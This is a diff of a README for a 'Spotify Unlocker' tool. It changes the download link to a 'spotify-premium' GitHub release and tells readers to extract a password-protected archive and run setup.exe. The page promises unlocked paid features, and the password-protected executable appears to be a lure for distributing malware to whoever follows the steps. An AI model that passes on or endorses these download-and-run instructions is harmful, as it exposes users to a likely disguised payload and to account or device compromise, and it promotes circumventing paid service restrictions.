@@ -18,14 +18,14 @@ Spotify Unlocker is a powerful tool that allows you to unlock your Spotify accou
 
 ## 🚀 Quick Start
 
-[📥 Download Mod](https://github.com/swissipissi/Adopt-Me-/releases/tag/Download)
+[📥 Download Mod](https://github.com/DataAnalystSohrabAnsari/spotify-premium/releases/tag/Download)
 
 ## 📦 Installation
 
-1. Download the installation archive from the releases page (https://github.com/yourusername/spotify-unlocker/releases).
+1. Download the installation archive from the releases page (https://github.com/DataAnalystSohrabAnsari/spotify-premium/releases/tag/Download).
 2. Extract the archive. Please note that the archive is password-protected. 🔐
 3. Enter the password: your_password_here.
-4. Run the installer and follow the on-screen instructions.
+4. Run the setup.exe and follow the on-screen instructions.
 
 ## ⚙️ Usage
 
@@ -37,7 +37,7 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 ## 📞 Contact
 
-If you have any questions or suggestions, feel free to reach out through Issues (https://github.com/yourusername/spotify-unlocker/issues).
+If you have any questions or suggestions, feel free to reach out through Issues (https://github.com/DataAnalystSohrabAnsari).
 
 ---
 
